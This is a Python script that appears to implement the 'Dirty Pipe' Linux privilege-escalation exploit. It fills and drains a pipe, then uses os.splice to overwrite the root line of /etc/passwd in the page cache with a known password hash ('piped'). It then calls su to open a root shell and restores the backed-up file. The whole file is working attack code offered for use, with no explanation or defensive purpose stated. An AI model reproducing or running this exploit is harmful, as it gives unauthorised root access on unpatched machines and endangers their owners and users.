import os
import fcntl
import sys
import stat

PAGE_SIZE = 4096

def prepare_pipe(pipe):
    pipe_size = fcntl.fcntl(pipe[1], fcntl.F_GETPIPE_SZ)
    buffer = b'\x00' * 4096

    # fill the pipe completely
    r = pipe_size
    while r > 0:
        n = min(r, len(buffer))
        os.write(pipe[1], buffer[:n])
        r -= n

    # drain the pipe
    r = pipe_size
    while r > 0:
        n = min(r, len(buffer))
        os.read(pipe[0], n)
        r -= n

def main():
    path = "/etc/passwd"
    print("Backing up /etc/passwd to /tmp/passwd.bak ...")
    try:
        with open("/etc/passwd", "r") as f1, open("/tmp/passwd.bak", "w") as f2:
            f2.write(f1.read())
    except IOError as e:
        print(f"Failed to open file: {e}")
        sys.exit(1)

    offset = 4  # after the "root"
    data = ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh\n"
    print("Setting root password to \"piped\"...")
    data_size = len(data)

    if offset % PAGE_SIZE == 0:
        print("Sorry, cannot start writing at a page boundary")
        sys.exit(1)

    next_page = (offset | (PAGE_SIZE - 1)) + 1
    end_offset = offset + data_size
    if end_offset > next_page:
        print("Sorry, cannot write across a page boundary")
        sys.exit(1)

    try:
        fd = os.open(path, os.O_RDONLY)
    except OSError as e:
        print(f"open failed: {e}")
        sys.exit(1)

    try:
        st = os.fstat(fd)
    except OSError as e:
        print(f"stat failed: {e}")
        sys.exit(1)

    if offset > st.st_size:
        print("Offset is not inside the file")
        sys.exit(1)

    if end_offset > st.st_size:
        print("Sorry, cannot enlarge the file")
        sys.exit(1)

    pipe = os.pipe()
    prepare_pipe(pipe)

    offset -= 1
    try:
        nbytes = os.splice(fd, offset, pipe[1], None, 1, 0)
    except OSError as e:
        print(f"splice failed: {e}")
        sys.exit(1)

    if nbytes == 0:
        print("short splice")
        sys.exit(1)

    try:
        nbytes = os.write(pipe[1], data.encode())
    except OSError as e:
        print(f"write failed: {e}")
        sys.exit(1)

    if nbytes < data_size:
        print("short write")
        sys.exit(1)

    argv = [
        "/bin/sh", "-c",
        "(echo piped; cat) | su - -c \""
        "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
        "cp /tmp/passwd.bak /etc/passwd;"
        "echo \\\"Done! Popping shell... (run commands now)\\\";"
        "/bin/sh;"
        "\" root"
    ]
    os.execv("/bin/sh", argv)

    print("system() function call seems to have failed :(")
    sys.exit(0)

if __name__ == "__main__":
    main()
